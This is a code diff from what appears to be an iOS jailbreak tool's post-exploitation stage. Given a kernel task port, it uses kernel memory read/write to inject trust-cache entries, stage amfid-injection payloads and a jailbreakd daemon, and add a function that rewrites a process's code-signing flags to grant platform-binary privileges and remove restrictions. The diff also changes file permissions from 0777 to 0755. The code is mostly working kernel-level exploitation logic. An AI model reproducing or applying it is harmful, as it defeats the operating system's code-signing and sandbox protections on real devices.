@@ -287,7 +287,8 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 	init_kernel(find_kernel_base(), NULL);
 	
 	// Get the slide
-	uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
+    uint64_t kernel_base = find_kernel_base();
+	uint64_t slide = kernel_base - 0xFFFFFFF007004000;
 	printf("slide: 0x%016llx\n", slide);
 	
 	// From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
@@ -457,7 +458,7 @@ do { \
     {
         if (!file_exist("/fun_bins")) {
             printf("making /fun_bins");
-            mkdir("/fun_bins", 0777);
+            mkdir("/fun_bins", 0755);
         }
         
         /* uncomment if you need to replace the binaries */
@@ -468,17 +469,17 @@ do { \
         if (!file_exist("/fun_bins/inject_amfid")) {
             printf("copy /fun_bins/inject_amfid\n");
             cp("/fun_bins/inject_amfid", progname("inject_amfid"));
-            chmod("/fun_bins/inject_amfid", 0777);
+            chmod("/fun_bins/inject_amfid", 0755);
         }
         if (!file_exist("/fun_bins/amfid_payload.dylib")) {
             printf("copy /fun_bins/amfid_payload.dylib\n");
             cp("/fun_bins/amfid_payload.dylib", progname("amfid_payload.dylib"));
-            chmod("/fun_bins/amfid_payload.dylib", 0777);
+            chmod("/fun_bins/amfid_payload.dylib", 0755);
         }
         if (!file_exist("/fun_bins/test.dylib")) {
             printf("copy /fun_bins/test.dylib\n");
             cp("/fun_bins/test.dylib", progname("test.dylib"));
-            chmod("/fun_bins/test.dylib", 0777);
+            chmod("/fun_bins/test.dylib", 0755);
         }
         
         printf("[fun] copied the required binaries into the right places\n");
@@ -505,11 +506,15 @@ do { \
 //	mkdir("/Library/LaunchDaemons", 777);
 //	cp("/Library/LaunchDaemons/test_fsigned.plist", plistPath2());
 
-    mkdir("/" BOOTSTRAP_PREFIX, 0777);
+    mkdir("/" BOOTSTRAP_PREFIX, 0755);
     const char *tar = "/" BOOTSTRAP_PREFIX "/tar";
     cp(tar, progname("tar"));
-    chmod(tar, 0777);
+    chmod(tar, 0755);
     inject_trusts(1, (const char **)&(const char*[]){tar});
+    
+    unlink("/"BOOTSTRAP_PREFIX"/jailbreakd");
+    cp("/"BOOTSTRAP_PREFIX"/jailbreakd", progname("jailbreakd"));
+    chmod("/"BOOTSTRAP_PREFIX"/jailbreakd", 0755);
 
     //rv = startprog(kern_ucred, true, tar, (char **)&(const char*[]){ tar, "-xpf", progname("cydia.tar"), "-C", "/", NULL });
     //inject_trusts(1, (const char **)&(const char*[]){"/Applications/Cydia.app/Cydia"});
@@ -528,7 +533,7 @@ do { \
     unlink("/"BOOTSTRAP_PREFIX"/launchjailbreak");
     const char *launchjailbreak = "/" BOOTSTRAP_PREFIX "/launchjailbreak";
     cp(launchjailbreak, progname("launchjailbreak"));
-    chmod(launchjailbreak, 0777);
+    chmod(launchjailbreak, 0755);
     
     if (rv == 0) {
         printf("Dropbear would be up soon\n");
@@ -575,6 +580,10 @@ do { \
 	 */
 	
 	// Cleanup
+    
+    printf("Starting server...\n");
+    mach_port_t pass_port = MACH_PORT_NULL;
+    start_jailbreakd(kern_ucred, &pass_port, tfp0, kernel_base);
 
 	wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
 	wk64(rk64(kern_ucred+0x78)+0x8, 0);
@@ -789,6 +798,26 @@ void filltheshitup(void) {
     wk64(tc, initial_trust);
 }
 
+int setcsflags(int pd){
+    int tries = 3;
+    while (tries-- > 0) {
+        sleep(1);
+        uint64_t proc = rk64(find_allproc());
+        while (proc) {
+            uint32_t pid = rk32(proc + offsetof_p_pid);
+            if (pid == pd) {
+                uint32_t csflags = rk32(proc + offsetof_p_csflags);
+                csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
+                wk32(proc + offsetof_p_csflags, csflags);
+                printf("empower PID %d\n", pid);
+                tries = 0;
+                break;
+            }
+            proc = rk64(proc);
+        }
+    }
+    return 0;
+}
 
 int startprog(uint64_t kern_ucred, bool wait, const char *prog, const char* args[], const char* envp[]) {
     pid_t pd;
